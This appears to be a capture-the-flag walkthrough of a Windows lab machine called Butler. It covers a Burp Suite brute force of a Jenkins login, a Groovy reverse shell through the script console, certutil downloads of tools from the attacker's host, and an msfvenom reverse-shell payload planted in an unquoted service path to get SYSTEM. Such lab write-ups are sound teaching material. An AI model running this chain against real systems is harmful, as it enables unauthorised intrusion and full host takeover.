# Butler

Import the machine. Use one of the following credentials to login:

Low Privilege User - `butler:JeNkIn5@44`
Admin - `administrator:A%rc!BcA!`

Open the command line and type `ipconfig` to get the IP Address.

Off to Kali. Lets run Nmap:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -p- -A 10.0.2.80
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-24 05:23 EST
Nmap scan report for 10.0.2.80
Host is up (0.00023s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Jetty 9.4.41.v20210516
|_http-server-header: Jetty(9.4.41.v20210516)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-24T10:27:54
|_  start_date: N/A
|_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:fc:06:e3 (Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

So  A LOT of ports are open. Feel free to look through and see what each port does. But we’ll be focusing on two ports namely `8080` and `7680`.

Accessing the first port leads us to a Jenkins login page. 

![jenkins login.png](Butler%20ef7a9df21ce048ae84027fd10668bb26/jenkins_login.png)

Jenkins is an automation server that helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration, and continuous delivery.

We can try looking for jenkins default credentials which are `admin:password` but that doesn’t work. 

We can also try to brute force directories with tools like `ffuf` or `dirbuster`, but those will prove to be unhelpful in this case.

Unfortunately there is no way to obtain the version information as well.

 Use google to search for jenkins exploits. There’s a couple of interesting results that can be explored, one example is [HackTricks](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security) which showcases multiple ways of exploiting a jenkins server, but we need to be authenticated first. 

Before we move on, let’s explore the port `7680`. This is an odd port, but google tells us that this is a port used by WUDO (Windows Update Delivery Optimization) to distribute updates in Windows LANs. 

We can try using telnet to listen in and see if there’s a connection using `telnet <MACHINE-IP> 7680`. Nothing. Try accessing through the browser? It stalls. Might be a false positive.

Okay, it seems like we need to brute force the jenkins server. There are different ways to do this such as using metasploit. But we will be using the Burp Suite method for this. 

Start Burp Suite (make sure Foxy Proxy is enabled in the browser and the intercept is turned on).

Go back to the jenkins login and type in anything and click sign in. Burp should capture the request:

![burp jenkins.png](Butler%20ef7a9df21ce048ae84027fd10668bb26/burp_jenkins.png)

Right click on this and select `Send to intruder`. Now go to the intruder tab, then the positions sub-tab and click the `Clear`.

Next highlight the following and click on `Add`.

![burp intruder.png](Butler%20ef7a9df21ce048ae84027fd10668bb26/burp_intruder.png)

Under Choose attack type, select `Cluster bomb` from the drop down list.

Then go to the `Payloads` sub-tab. Here we will try to add a bunch of usernames and passwords that we want to brute force.

For Payload Set 1 (Usernames). Under Payload Settings (Simple List), Enter a username into the text box and click `Add`:

![burp payload set 1.png](Butler%20ef7a9df21ce048ae84027fd10668bb26/burp_payload_set_1.png)

For Payload Set 2 (Passwords). We add the following passwords:

![burp payload set 2.png](Butler%20ef7a9df21ce048ae84027fd10668bb26/burp_payload_set_2.png)

Click on `Start attack`

![burp intruder result.png](Butler%20ef7a9df21ce048ae84027fd10668bb26/burp_intruder_result.png)

Make sure to check the length column in every line and compare to the other results. This will eventually lead us to a potential username and password i.e `jenkins:jenkins`

Make sure Intercept is turned off in the Target tab and foxy proxy is disabled in your browser. Now lets try using the credentials on the login page.

![Jenkins dashboard.png](Butler%20ef7a9df21ce048ae84027fd10668bb26/Jenkins_dashboard.png)

It worked. Now that we are authenticated we can look up some ways to run code execution.

On the Dashboard, click on `Manage Jenkins` then scroll down to `Tools & Actions` and select `Script Console` .

![jenkins script console.png](Butler%20ef7a9df21ce048ae84027fd10668bb26/jenkins_script_console.png)

Looks like we can run groovy scripts on this page to get a reverse shell. Hop on google and look for `groovy reverse shell`. This should lead us to this [repo](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). Copy the script and paste it into the script console.

Before we run it. Lets change the `[localhost](http://localhost)` to our Kali IP address. Changing the port is optional.

Next start a netcat listener using `nc -lvnp 8044`

Click run in the script console. And our listener should connect us through

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 8044            
listening on [any] 8044 ...
connect to [10.0.2.4] from (UNKNOWN) [10.0.2.80] 50070
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Jenkins>whoami
whoami
butler\butler

c:\Program Files\Jenkins> cd c:\Users
 cd c:\Users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Users

08/14/2021  04:29 AM    <DIR>          .
08/14/2021  04:29 AM    <DIR>          ..
01/26/2024  09:38 AM    <DIR>          Administrator
01/26/2024  10:16 AM    <DIR>          butler
08/14/2021  05:25 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  11,192,856,576 bytes free

c:\Users>cd butler
cd butler

c:\Users\butler>cd
cd
c:\Users\butler

c:\Users\butler>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Users\butler

01/26/2024  10:16 AM    <DIR>          .
01/26/2024  10:16 AM    <DIR>          ..
08/14/2021  04:16 AM    <DIR>          .groovy
08/14/2021  03:54 AM    <DIR>          3D Objects
08/14/2021  03:54 AM    <DIR>          Contacts
08/14/2021  03:54 AM    <DIR>          Desktop
08/14/2021  03:54 AM    <DIR>          Documents
08/14/2021  04:23 AM    <DIR>          Downloads
08/14/2021  03:54 AM    <DIR>          Favorites
08/14/2021  03:54 AM    <DIR>          Links
08/14/2021  03:54 AM    <DIR>          Music
08/14/2021  03:56 AM    <DIR>          OneDrive
08/14/2021  03:55 AM    <DIR>          Pictures
08/14/2021  03:54 AM    <DIR>          Saved Games
08/14/2021  03:55 AM    <DIR>          Searches
08/14/2021  03:54 AM    <DIR>          Videos
01/26/2024  09:34 AM         2,387,456 winpeas.exe
               1 File(s)      2,387,456 bytes
              16 Dir(s)  11,191,963,648 bytes free

c:\Users\butler>cd Downloads
cd Downloads

c:\Users\butler\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Users\butler\Downloads

08/14/2021  04:23 AM    <DIR>          .
08/14/2021  04:23 AM    <DIR>          ..
08/14/2021  04:23 AM        16,013,912 WiseCare365_5.6.7.568.exe
               1 File(s)     16,013,912 bytes
               2 Dir(s)  11,182,903,296 bytes free

```

We can explore the directories in hopes of finding something interesting. Such as the WiseCare365 executable in the Downloads folder./

We can also use the `systeminfo` command to provide some more details on the OS for privilege escalation purposes.  But for ease of use, we will use a tool called [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). Make sure to download the [`winPEASx64.exe`](https://github.com/carlospolop/PEASS-ng/releases/download/20240124-4b54e914/winPEASx64.exe) file.

Next we will have to move it from our machine to the windows machine.

In kali, move to the directory winpeas is and start a python server `python3 -m http.server 80`

Back in the windows machine, we can download the file using the `cerutil.exe` command:

```bash
c:\Users\butler>certutil.exe -urlcache -f http://10.0.2.4/winpeas.exe winpeas.exe
certutil.exe -urlcache -f http://10.0.2.4/winpeas.exe winpeas.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Users\butler>dir  
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Users\butler

01/26/2024  09:34 AM    <DIR>          .
01/26/2024  09:34 AM    <DIR>          ..
08/14/2021  04:16 AM    <DIR>          .groovy
08/14/2021  03:54 AM    <DIR>          3D Objects
08/14/2021  03:54 AM    <DIR>          Contacts
08/14/2021  03:54 AM    <DIR>          Desktop
08/14/2021  03:54 AM    <DIR>          Documents
08/14/2021  04:23 AM    <DIR>          Downloads
08/14/2021  03:54 AM    <DIR>          Favorites
08/14/2021  03:54 AM    <DIR>          Links
08/14/2021  03:54 AM    <DIR>          Music
08/14/2021  03:56 AM    <DIR>          OneDrive
08/14/2021  03:55 AM    <DIR>          Pictures
08/14/2021  03:54 AM    <DIR>          Saved Games
08/14/2021  03:55 AM    <DIR>          Searches
08/14/2021  03:54 AM    <DIR>          Videos
01/26/2024  09:34 AM         2,387,456 winpeas.exe
               1 File(s)      2,387,456 bytes
              16 Dir(s)  11,417,591,808 bytes free
```

Run the file using `winpeas.exe`

There will be a lot of information to sift through. But the goal is to look for “quick wins” something we can use to escalate privileges without using up too much time.

Eventually we’ll find something related to the WiseCare365 application from earlier:

![winpeas.png](Butler%20ef7a9df21ce048ae84027fd10668bb26/winpeas.png)

This is an example of an unquoted service path. This is where you have a path to a service executable and the folder names along that path have spaces in them without quotations. This allows one to inject a malicious file within that path for the system to execute. Read more about the Unqouted Service Path vulnerability [here](https://www.ired.team/offensive-security/privilege-escalation/unquoted-service-paths).

So basically we need to create a malicious executable. And one of the best ways to do that is using the tool `msfvenom`.

They syntax for creating a windows executable with msfvenom is: `msfvenom -p windows/x64/shell_reverse_tcp LHOST= <MACHINE-IP> LPORT = <PORT> -f exe -o <FILENAME>`

```bash
┌──(kali㉿kali)-[~/transfer]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=7777 -f exe -o Wise.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: Wise.exe
```

We now have a malicious file `Wise.exe` ready to be uploaded to our Windows machine.

Start a python server in the same directory and a netcat listener (using the port specified in the malicious payload) in another terminal .

Back in the windows machine. Let’s move to the directory we need to move our Wise.exe:

```bash
c:\Users\butler\Downloads>cd c:\
cd c:\

c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\

12/07/2019  01:14 AM    <DIR>          PerfLogs
08/14/2021  04:11 AM    <DIR>          Program Files
08/14/2021  04:34 AM    <DIR>          Program Files (x86)
08/14/2021  04:29 AM    <DIR>          Users
08/14/2021  04:39 AM    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)  11,112,075,264 bytes free

c:\>cd "Program Files (x86)"

c:\Program Files (x86)>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Program Files (x86)

08/14/2021  04:34 AM    <DIR>          .
08/14/2021  04:34 AM    <DIR>          ..
08/14/2021  04:05 AM    <DIR>          Common Files
12/07/2019  01:49 AM    <DIR>          Internet Explorer
01/24/2024  02:27 AM    <DIR>          Microsoft
12/07/2019  01:31 AM    <DIR>          Microsoft.NET
04/09/2021  05:55 AM    <DIR>          Windows Defender
04/09/2021  05:55 AM    <DIR>          Windows Mail
04/09/2021  05:55 AM    <DIR>          Windows Media Player
12/07/2019  01:52 AM    <DIR>          Windows Multimedia Platform
12/07/2019  01:49 AM    <DIR>          Windows NT
04/09/2021  05:55 AM    <DIR>          Windows Photo Viewer
12/07/2019  01:52 AM    <DIR>          Windows Portable Devices
12/07/2019  01:31 AM    <DIR>          WindowsPowerShell
08/14/2021  05:28 AM    <DIR>          Wise
               0 File(s)              0 bytes
              15 Dir(s)  11,106,832,384 bytes free

c:\Program Files (x86)>cd Wise
cd Wise

c:\Program Files (x86)\Wise>certutil -urlcache -f http://10.0.2.4/Wise.exe Wise.exe
certutil -urlcache -f http://10.0.2.4/Wise.exe Wise.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\Program Files (x86)\Wise>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1067-CB24

 Directory of c:\Program Files (x86)\Wise

01/26/2024  11:11 AM    <DIR>          .
01/26/2024  11:11 AM    <DIR>          ..
08/14/2021  04:34 AM    <DIR>          Wise Care 365
01/26/2024  11:11 AM             7,168 Wise.exe
               1 File(s)          7,168 bytes
               3 Dir(s)  11,068,026,880 bytes free

c:\Program Files (x86)\Wise>sc stop WiseBootAssistant
sc stop WiseBootAssistant

SERVICE_NAME: WiseBootAssistant 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x1388

c:\Program Files (x86)\Wise>sc query WiseBootAssistant
sc query WiseBootAssistant

SERVICE_NAME: WiseBootAssistant 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

c:\Program Files (x86)\Wise>sc start WiseBootAssistant
sc start WiseBootAssistant
```

So a couple of things happened here. We moved over to the `Program Files (x86)` directory. 

Then we moved to the `Wise` folder and used the `certutil` command to move download our malicious `Wise.exe` file. 

Next, if we had executed the payload as is. We would’ve gotten back another shell as the butler user. Not system(root). So we had to use the `sc stop WiseBootAssistant` command to terminate the initial service, `WiseBootAssistant` that’s running as system. Then use the `sc query WiseBootAssistant` command to check if the service has stopped running.

Finally we start the process again using `sc start WiseBootAssistant`. And this time the service should run as system giving us a privileged shell back in our netcat listener:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.0.2.4] from (UNKNOWN) [10.0.2.80] 49726
Microsoft Windows [Version 10.0.19043.928]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Thats it!!! 😎